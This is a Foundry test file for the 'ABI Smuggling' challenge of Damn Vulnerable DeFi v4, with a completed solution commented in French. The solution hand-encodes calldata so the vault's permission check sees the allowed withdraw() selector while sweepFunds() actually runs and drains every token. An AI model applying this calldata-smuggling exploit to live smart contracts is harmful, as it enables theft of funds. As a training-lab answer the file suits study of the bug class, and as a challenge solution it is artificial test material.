// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // EXPLOIT : ABI Smuggling - on manipule l'encodage ABI pour bypass les checks
        // Le vault vérifie que le selector est withdraw() mais on va exécuter sweepFunds()
        
        // On encode l'action réelle qu'on veut faire : sweepFunds vers recovery
        bytes memory actionData =
            abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, IERC20(address(token)));

        // On craft un calldata spécial qui :
        // 1. Fait croire au vault qu'on appelle withdraw() (selector vérifié)
        // 2. Mais en réalité fait exécuter sweepFunds() (dans actionData)
        // 3. Exploite le fait que le vault décode mal les paramètres dynamiques
        bytes memory callData = abi.encodePacked(
            AuthorizedExecutor.execute.selector,   // execute()
            bytes32(uint256(uint160(address(vault)))),  // target = vault
            bytes32(uint256(0x80)),                // offset vers actionData (manipulé)
            bytes32(0),                            // value = 0
            bytes32(uint256(uint32(SelfAuthorizedVault.withdraw.selector)) << 224),  // fake selector
            uint256(actionData.length),            // longueur de actionData
            actionData                             // vraie action = sweepFunds
        );

        // On appelle avec notre calldata smugglé
        (bool ok,) = address(vault).call(callData);
        require(ok, "call failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
